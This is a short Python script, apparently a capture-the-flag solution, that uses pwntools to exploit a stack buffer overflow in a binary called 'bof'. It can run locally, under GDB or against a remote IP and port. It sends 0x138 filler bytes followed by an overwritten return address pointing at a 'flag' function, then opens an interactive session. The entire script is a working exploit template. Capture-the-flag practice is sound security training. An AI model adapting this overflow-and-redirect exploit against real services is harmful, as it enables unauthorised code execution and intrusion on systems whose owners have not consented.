#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *


exe = ELF('./bof')
host = '35.242.207.48'
port = 31895

# libc = ELF('./path/to/libc')
# rop = ROP(exe)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
context.binary = exe



# Run without randomization
# python3 solve.py GDB NOASLR



def conn(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

flag = 0x400767 

def solve():
    io = conn()

    io.recvline()
    
    exploit = b'A' * 0x138
    exploit += p64(flag)
    
    io.sendline(exploit)

    io.interactive()
    
if __name__ == "__main__":
    solve()

